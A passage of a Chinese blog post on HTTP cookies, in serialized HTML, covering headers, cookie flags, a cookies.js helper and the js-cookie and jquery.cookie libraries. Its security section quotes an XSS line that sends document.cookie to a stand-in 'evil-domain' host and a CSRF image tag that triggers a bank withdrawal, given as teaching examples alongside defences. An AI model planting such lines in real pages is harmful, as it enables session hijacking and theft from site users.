class=\"string\">\"value\"</span>, &#123; <span class=\"attr\">expires</span>: <span class=\"number\">7</span> &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Create expiring cookie, valid across entire site:</span></span><br><span class=\"line\">$.cookie(<span class=\"string\">\"name\"</span>, <span class=\"string\">\"value\"</span>, &#123; <span class=\"attr\">expires</span>: <span class=\"number\">7</span>, <span class=\"attr\">path</span>: <span class=\"string\">\"/\"</span> &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Read cookie:</span></span><br><span class=\"line\">$.cookie(<span class=\"string\">\"name\"</span>); <span class=\"comment\">// =&gt; \"value\"</span></span><br><span class=\"line\">$.cookie(<span class=\"string\">\"nothing\"</span>); <span class=\"comment\">// =&gt; undefined</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Read all available cookies:</span></span><br><span class=\"line\">$.cookie(); <span class=\"comment\">// =&gt; &#123; \"name\": \"value\" &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Delete cookie:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Returns true when cookie was successfully deleted, otherwise false</span></span><br><span class=\"line\">$.removeCookie(<span class=\"string\">\"name\"</span>); <span class=\"comment\">// =&gt; true</span></span><br><span class=\"line\">$.removeCookie(<span class=\"string\">\"nothing\"</span>); <span class=\"comment\">// =&gt; false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Need to use the same attributes (path, domain) as what the cookie was written with</span></span><br><span class=\"line\">$.cookie(<span class=\"string\">\"name\"</span>, <span class=\"string\">\"value\"</span>, &#123; <span class=\"attr\">path</span>: <span class=\"string\">\"/\"</span> &#125;);</span><br><span class=\"line\"><span class=\"comment\">// This won't work!</span></span><br><span class=\"line\">$.removeCookie(<span class=\"string\">\"name\"</span>); <span class=\"comment\">// =&gt; false</span></span><br><span class=\"line\"><span class=\"comment\">// This will work!</span></span><br><span class=\"line\">$.removeCookie(<span class=\"string\">\"name\"</span>, &#123; <span class=\"attr\">path</span>: <span class=\"string\">\"/\"</span> &#125;); <span class=\"comment\">// =&gt; true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Note: when deleting a cookie, you must pass the exact same path, domain and secure options that were used to set the cookie, unless you're relying on the default options that is.</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"实践场景\"><a href=\"#实践场景\" class=\"headerlink\" title=\"实践场景\"></a>实践场景</h2><p>系统升级后，对于历史 B 类买家，第一次登陆系统后在对应的承载页给出弹框提示。<br>实现思路：登陆时后端根据账户数据判断出是否为符合条件的用户，符合则在响应头中设置 cookie 值，前端页面加载时获取对应的 cookie 值，判断是否需要显示弹框。弹框确认关闭后清除 cookie。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies</a></p>\n<p><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie/Simple_document.cookie_framework\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie/Simple_document.cookie_framework</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。</p>","more":"<p>Cookie 主要用于以下三个方面：</p>\n<ul>\n<li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>\n<li>个性化设置（如用户自定义设置、主题等）</li>\n<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>\n</ul>\n<p>Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB 。</p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"创建-Cookie\"><a href=\"#创建-Cookie\" class=\"headerlink\" title=\"创建 Cookie\"></a>创建 Cookie</h2><p>当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 Set-Cookie 选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 Cookie 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。</p>\n<h3 id=\"Set-Cookie-响应头部和-Cookie-请求头部\"><a href=\"#Set-Cookie-响应头部和-Cookie-请求头部\" class=\"headerlink\" title=\"Set-Cookie 响应头部和 Cookie 请求头部\"></a>Set-Cookie 响应头部和 Cookie 请求头部</h3><p>服务器使用<code>Set-Cookie</code>响应头部向用户代理（一般是浏览器）发送 Cookie 信息。一个简单的 Cookie 可能像这样：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie: &lt;cookie名&gt;=&lt;cookie值&gt;</span><br></pre></td></tr></table></figure>\n<p>服务器通过该头部告知客户端<strong>保存</strong>Cookie 信息。</p>\n<p>对于服务端程序中设置 Set-Cookie 响应头信息，不同语言有各自的语法，Node.JS 示例如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">response.setHeader(<span class=\"string\">\"Set-Cookie\"</span>, [<span class=\"string\">\"type=ninja\"</span>, <span class=\"string\">\"language=javascript\"</span>]);</span><br></pre></td></tr></table></figure>\n<p>响应头示例：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.0 200 OK</span><br><span class=\"line\">Content-type: text/html</span><br><span class=\"line\">Set-Cookie: yummy_cookie=choco</span><br><span class=\"line\">Set-Cookie: tasty_cookie=strawberry</span><br></pre></td></tr></table></figure>\n<p>下一次的请求头示例：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /sample_page.html HTTP/1.1</span><br><span class=\"line\">Host: www.example.org</span><br><span class=\"line\">Cookie: yummy_cookie=choco; tasty_cookie=strawberry</span><br></pre></td></tr></table></figure>\n<h2 id=\"几个概念\"><a href=\"#几个概念\" class=\"headerlink\" title=\"几个概念\"></a>几个概念</h2><p>会话期 Cookie：浏览器关闭自动删除 cookie。</p>\n<p>持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）。</p>\n<p>Cookie 的 Secure 标记：Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。</p>\n<p>Cookie 的 HttpOnly 标记：只能发送给服务端而不能被 JavaScript 脚本调用。</p>\n<p>Cookie 的作用域：Domain 和 Path 标识定义了 Cookie 的作用域，即 Cookie 应该发送给哪些 URL。</p>\n<p>JavaScript 调用：通过 Document.cookie 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。</p>\n<h2 id=\"安全\"><a href=\"#安全\" class=\"headerlink\" title=\"安全\"></a>安全</h2><blockquote>\n<p>当机器处于不安全环境时，切记不能通过 HTTP Cookie 存储、传输敏感信息。</p>\n</blockquote>\n<h3 id=\"会话劫持和-XSS\"><a href=\"#会话劫持和-XSS\" class=\"headerlink\" title=\"会话劫持和 XSS\"></a>会话劫持和 XSS</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</span><br></pre></td></tr></table></figure>\n<h3 id=\"跨站请求伪造（CSRF）\"><a href=\"#跨站请求伪造（CSRF）\" class=\"headerlink\" title=\"跨站请求伪造（CSRF）\"></a>跨站请求伪造（CSRF）</h3><p>比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">src</span>=<span class=\"string\">\"http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory\"</span></span></span><br><span class=\"line\"><span class=\"tag\">/&gt;</span></span><br></pre></td></tr></table></figure>\n<p>当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：</p>\n<ul>\n<li>对用户输入进行过滤来阻止 XSS；</li>\n<li>任何敏感操作都需要确认；</li>\n<li>用于敏感信息的 Cookie 只能拥有较短的生命周期；</li>\n<li>更多方法可以查看<a href=\"https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF\" target=\"_blank\" rel=\"noopener\">OWASP CSRF prevention cheat sheet</a>_Prevention_Cheat_Sheet&gt;)。</li>\n</ul>\n<h2 id=\"封装一个-cookie-使用库\"><a href=\"#封装一个-cookie-使用库\" class=\"headerlink\" title=\"封装一个 cookie 使用库\"></a>封装一个 cookie 使用库</h2><p>写入一个 cookie：<code>docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])</code></p>\n<p>获取一个 cookie：<code>docCookies.getItem(name)</code></p>\n<p>移除一个 cookie：<code>docCookies.removeItem(name[, path[, domain]])</code></p>\n<p>检查一个 cookie（是否存在）：<code>docCookies.hasItem(name)</code></p>\n<p>获取所有 cookie 列表：<code>docCookies.keys()</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*\\</span></span><br><span class=\"line\"><span class=\"comment\">|*|</span></span><br><span class=\"line\"><span class=\"comment\">|*|  :: cookies.js ::</span></span><br><span class=\"line\"><span class=\"comment\">|*|</span></span><br><span class=\"line\"><span class=\"comment\">|*|  A complete cookies reader/writer framework with full unicode support.</span></span><br><span class=\"line\"><span class=\"comment\">|*|</span></span><br><span class=\"line\"><span class=\"comment\">|*|  Revision #1 - September 4, 2014</span></span><br><span class=\"line\"><span class=\"comment\">|*|</span></span><br><span class=\"line\"><span class=\"comment\">|*|  https://developer.mozilla.org/en-US/docs/Web/API/document.cookie</span></span><br><span class=\"line\"><span class=\"comment\">|*|  https://developer.mozilla.org/User:fusionchess</span></span><br><span class=\"line\"><span class=\"comment\">|*|  https://github.com/madmurphy/cookies.js</span></span><br><span class=\"line\"><span class=\"comment\">|*|</span></span><br><span class=\"line\"><span class=\"comment\">|*|  This framework is released under the GNU Public License, version 3 or later.</span></span><br><span class=\"line\"><span class=\"comment\">|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html</span></span><br><span class=\"line\"><span class=\"comment\">|*|</span></span><br><span class=\"line\"><span class=\"comment\">|*|  Syntaxes:</span></span><br><span class=\"line\"><span class=\"comment\">|*|</span></span><br><span class=\"line\"><span class=\"comment\">|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])</span></span><br><span class=\"line\"><span class=\"comment\">|*|  * docCookies.getItem(name)</span></span><br><span class=\"line\"><span class=\"comment\">|*|  * docCookies.removeItem(name[, path[, domain]])</span></span><br><span class=\"line\"><span class=\"comment\">|*|  * docCookies.hasItem(name)</span></span><br><span class=\"line\"><span class=\"comment\">|*|  * docCookies.keys()</span></span><br><span class=\"line\"><span class=\"comment\">|*|</span></span><br><span class=\"line\"><span class=\"comment\">\\*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> docCookies = &#123;</span><br><span class=\"line\">  getItem: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">sKey</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!sKey) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"built_in\">decodeURIComponent</span>(</span><br><span class=\"line\">        <span class=\"built_in\">document</span>.cookie.replace(</span><br><span class=\"line\">          <span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(</span><br><span class=\"line\">            <span class=\"string\">\"(?:(?:^|.*;)\\\\s*\"</span> +</span><br><span class=\"line\">              <span class=\"built_in\">encodeURIComponent</span>(sKey).replace(<span class=\"regexp\">/[\\-\\.\\+\\*]/g</span>, <span class=\"string\">\"\\\\$&amp;\"</span>) +</span><br><span class=\"line\">              <span class=\"string\">\"\\\\s*\\\\=\\\\s*([^;]*).*$)|^.*$\"</span></span><br><span class=\"line\">          ),</span><br><span class=\"line\">          <span class=\"string\">\"$1\"</span></span><br><span class=\"line\">        )</span><br><span class=\"line\">      ) || <span class=\"literal\">null</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  setItem: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">sKey, sValue, vEnd, sPath, sDomain, bSecure</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!sKey || <span class=\"regexp\">/^(?:expires|max\\-age|path|domain|secure)$/i</span>.test(sKey)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> sExpires = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (vEnd) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">switch</span> (vEnd.constructor) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"built_in\">Number</span>:</span><br><span class=\"line\">          sExpires =</span><br><span class=\"line\">            vEnd === <span class=\"literal\">Infinity</span></span><br><span class=\"line\">              ? <span class=\"string\">\"; expires=Fri, 31 Dec 9999 23:59:59 GMT\"</span></span><br><span class=\"line\">              : <span class=\"string\">\"; max-age=\"</span> + vEnd;</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"built_in\">String</span>:</span><br><span class=\"line\">          sExpires = <span class=\"string\">\"; expires=\"</span> + vEnd;</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"built_in\">Date</span>:</span><br><span class=\"line\">          sExpires = <span class=\"string\">\"; expires=\"</span> + vEnd.toUTCString();</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">document</span>.cookie =</span><br><span class=\"line\">      <span class=\"built_in\">encodeURIComponent</span>(sKey) +</span><br><span class=\"line\">      <span class=\"string\">\"=\"</span> +</span><br><span class=\"line\">      <span class=\"built_in\">encodeURIComponent</span>(sValue) +</span><br><span class=\"line\">      sExpires +</span><br><span class=\"line\">      (sDomain ? <span class=\"string\">\"; domain=\"</span> + sDomain : <span class=\"string\">\"\"</span>) +</span><br><span class=\"line\">      (sPath ? <span class=\"string\">\"; path=\"</span> + sPath : <span class=\"string\">\"\"</span>) +</span><br><span class=\"line\">      (bSecure ? <span class=\"string\">\"; secure\"</span> : <span class=\"string\">\"\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  removeItem: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">sKey, sPath, sDomain</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">this</span>.hasItem(sKey)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">document</span>.cookie =</span><br><span class=\"line\">      <span class=\"built_in\">encodeURIComponent</span>(sKey) +</span><br><span class=\"line\">      <span class=\"string\">\"=; expires=Thu, 01 Jan 1970 00:00:00 GMT\"</span> +</span><br><span class=\"line\">      (sDomain ? <span class=\"string\">\"; domain=\"</span> + sDomain : <span class=\"string\">\"\"</span>) +</span><br><span class=\"line\">      (sPath ? <span class=\"string\">\"; path=\"</span> + sPath : <span class=\"string\">\"\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  hasItem: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">sKey</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!sKey) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(</span><br><span class=\"line\">      <span class=\"string\">\"(?:^|;\\\\s*)\"</span> +</span><br><span class=\"line\">        <span class=\"built_in\">encodeURIComponent</span>(sKey).replace(<span class=\"regexp\">/[\\-\\.\\+\\*]/g</span>, <span class=\"string\">\"\\\\$&amp;\"</span>) +</span><br><span class=\"line\">        <span class=\"string\">\"\\\\s*\\\\=\"</span></span><br><span class=\"line\">    ).test(<span class=\"built_in\">document</span>.cookie);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  keys: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> aKeys = <span class=\"built_in\">document</span>.cookie</span><br><span class=\"line\">      .replace(<span class=\"regexp\">/((?:^|\\s*;)[^\\=]+)(?=;|$)|^\\s*|\\s*(?:\\=[^;]*)?(?:\\1|$)/g</span>, <span class=\"string\">\"\"</span>)</span><br><span class=\"line\">      .split(<span class=\"regexp\">/\\s*(?:\\=[^;]*)?;\\s*/</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> nLen = aKeys.length, nIdx = <span class=\"number\">0</span>; nIdx &lt; nLen; nIdx++) &#123;</span><br><span class=\"line\">      aKeys[nIdx] = <span class=\"built_in\">decodeURIComponent</span>(aKeys[nIdx]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> aKeys;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"第三方库\"><a href=\"#第三方库\" class=\"headerlink\" title=\"第三方库\"></a>第三方库</h2><p><a href=\"https://github.com/carhartl/jquery-cookie#readme\" target=\"_blank\" rel=\"noopener\">jquery.cookie.js</a>官方已停止维护，并推荐使用全新的<a href=\"https://github.com/js-cookie/js-cookie\" target=\"_blank\" rel=\"noopener\">js-cookie</a>。</p>\n<h3 id=\"js-cookie\"><a href=\"#js-cookie\" class=\"headerlink\" title=\"js-cookie\"></a>js-cookie</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 创建一个cookie，在整个网站有效</span></span><br><span class=\"line\">Cookies.set(<span class=\"string\">\"name\"</span>, <span class=\"string\">\"value\"</span>);</span><br><span class=\"line\"><span class=\"comment\">// 创建一个cookie，有效期为7天，整个网站有效</span></span><br><span class=\"line\">Cookies.set(<span class=\"string\">\"name\"</span>, <span class=\"string\">\"value\"</span>, &#123; <span class=\"attr\">expires</span>: <span class=\"number\">7</span> &#125;);</span><br><span class=\"line\"><span class=\"comment\">// 创建一个cookie，有效期7天，当前路径有效</span></span><br><span class=\"line\">Cookies.set(<span class=\"string\">\"name\"</span>, <span class=\"string\">\"value\"</span>, &#123; <span class=\"attr\">expires</span>: <span class=\"number\">7</span>, <span class=\"attr\">path</span>: <span class=\"string\">\"\"</span> &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 读取</span></span><br><span class=\"line\">Cookies.get(<span class=\"string\">\"name\"</span>); <span class=\"comment\">// =&gt; 'value'</span></span><br><span class=\"line\">Cookies.get(<span class=\"string\">\"nothing\"</span>); <span class=\"comment\">// =&gt; undefined</span></span><br><span class=\"line\"><span class=\"comment\">// 读取所有</span></span><br><span class=\"line\">Cookies.get(); <span class=\"comment\">// =&gt; &#123; name: 'value' &#125;</span></span><br><span class=\"line\"><span class=\"comment\">// 通过设置domain或者path来读取特定cookie是不起效果的</span></span><br><span class=\"line\">Cookies.get(<span class=\"string\">\"foo\"</span>, &#123; <span class=\"attr\">domain</span>: <span class=\"string\">\"sub.example.com\"</span> &#125;); <span class=\"comment\">// `domain` won't have any effect...!</span></span><br><span class=\"line\"><span class=\"comment\">// 删除</span></span><br><span class=\"line\">Cookies.remove(<span class=\"string\">\"name\"</span>);</span><br><span class=\"line\"><span class=\"comment\">// 对于设置了domain或者path的cookie，删除时也必须配置相应的属性参数</span></span><br><span class=\"line\">Cookies.set(<span class=\"string\">\"name\"</span>, <span class=\"string\">\"value\"</span>, &#123; <span class=\"attr\">path</span>: <span class=\"string\">\"\"</span> &#125;);</span><br><span class=\"line\">Cookies.remove(<span class=\"string\">\"name\"</span>); <span class=\"comment\">// fail!</span></span><br><span class=\"line\">Cookies.remove(<span class=\"string\">\"name\"</span>, &#123; <span class=\"attr\">path</span>: <span class=\"string\">\"\"</span> &#125;); <span class=\"comment\">// removed!</span></span><br><span class=\"line\"></span><br><span class=\"line\">Cookies.remove(<span class=\"string\">\"name\"</span>, &#123; <span class=\"attr\">path</span>: <span class=\"string\">\"\"</span>, <span class=\"attr\">domain</span>: <span class=\"string\">\".yourdomain.com\"</span> &#125;);</span><br></pre></td></tr></table></figure>\n<h3 id=\"jquery-cookie-js\"><a href=\"#jquery-cookie-js\" class=\"headerlink\" title=\"jquery.cookie.js\"></a>jquery.cookie.js</h3><p>使用逻辑与 <code>js-cookie</code> 一致</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Create session cookie:</span></span><br><span class=\"line\">$.cookie(<span class=\"string\">\"name\"</span>, <span class=\"string\">\"value\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Create expiring cookie, 7 days from then:</span></span><br><span class=\"line\">$.cookie(<span class=\"string\">\"name\"</span>, <span class=\"string\">\"value\"</span>, &#123; <span class=\"attr\">expires</span>: <span class=\"number\">7</span> &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Create expiring cookie, valid across entire site:</span></span><br><span class=\"line\">$.cookie(<span class=\"string\">\"name\"</span>, <span class=\"string\">\"value\"</span>, &#123; <span class=\"attr\">expires</span>: <span class=\"number\">7</span>, <span class=\"attr\">path</span>: <span class=\"string\">\"/\"</span> &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Read cookie:</span></span><br><span class=\"line\">$.cookie(<span class=\"string\">\"name\"</span>); <span class=\"comment\">// =&gt; \"value\"</span></span><br><span class=\"line\">$.cookie(<span class=\"string\">\"nothing\"</span>); <span class=\"comment\">// =&gt; undefined</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Read all available cookies:</span></span><br><span class=\"line\">$.cookie(); <span class=\"comment\">// =&gt; &#123; \"name\": \"value\" &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Delete cookie:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Returns true when cookie was successfully deleted, otherwise false</span></span><br><span class=\"line\">$.removeCookie(<span class=\"string\">\"name\"</span>); <span class=\"comment\">// =&gt; true</span></span><br><span class=\"line\">$.removeCookie(<span class=\"string\">\"nothing\"</span>); <span class=\"comment\">// =&gt; false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Need to use the same attributes (path, domain) as what the cookie was written with</span></span><br><span class=\"line\">$.cookie(<span class=\"string\">\"name\"</span>, <span class=\"string\">\"value\"</span>, &#123; <span class=\"attr\">path</span>: <span class=\"string\">\"/\"</span> &#125;);</span><br><span class=\"line\"><span class=\"comment\">// This won't work!</span></span><br><span class=\"line\">$.removeCookie(<span 